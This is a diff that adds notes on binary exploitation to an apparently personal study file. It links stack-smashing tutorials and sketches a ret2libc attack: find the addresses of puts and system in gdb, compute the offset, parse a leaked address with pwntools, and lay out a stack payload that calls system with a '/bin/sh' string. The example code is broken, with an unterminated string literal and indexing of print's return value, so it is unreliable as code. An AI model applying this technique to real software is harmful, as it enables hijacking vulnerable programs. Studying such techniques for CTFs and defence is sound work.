@@ -1,5 +1,7 @@
 
-
+'''
+https://sploitfun.wordpress.com <--- GOOD SHIT
+'''
 
 
 '''
@@ -13,4 +15,28 @@ High Level
 
 
 https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/
+'''
+
+
+'''
+EXAMPLE:
+
+import re
+
+*in gdb*
+x puts --> get address of function
+x system --> get address of system
+offset = gdb_puts - gdb_system
+
+elf = pwn.ELF('./<filename>')
+p = elf.process()
+print(p.recv())
+
+puts = print(re.findall('puts: (.*)', prompt))[0]
+bin_bash = re.findall('useful_string: (.*), prompt)[0]
+
+system = int(puts, 16) - offset
+
+[fill stack][fill ebp 4 bytes][system address][JUNK 4 bytes][/bin/sh string address]
+
 '''
